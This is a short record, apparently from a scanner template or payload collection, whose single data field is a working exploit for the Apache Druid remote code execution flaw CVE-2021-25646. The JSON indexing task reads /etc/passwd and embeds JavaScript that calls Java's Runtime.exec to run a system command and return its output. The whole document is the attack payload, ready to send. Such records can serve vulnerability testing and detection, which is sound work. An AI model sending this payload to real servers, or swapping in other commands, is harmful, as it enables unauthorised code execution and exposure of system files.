name: Apache Druid RCE (CVE-2021-25646)
data: {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/etc","filter":"passwd"}},"dataSchema":{"dataSource":"test","parser":{"type":"string","parseSpec":{"format":"javascript","function":"function(str) { var r = java.lang.Runtime.getRuntime(); var p = r.exec(['id']); p.waitFor(); var br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); var line = ''; var result = ''; while((line = br.readLine()) != null) { result += line; } return { 'id': result }; }"}}}}}
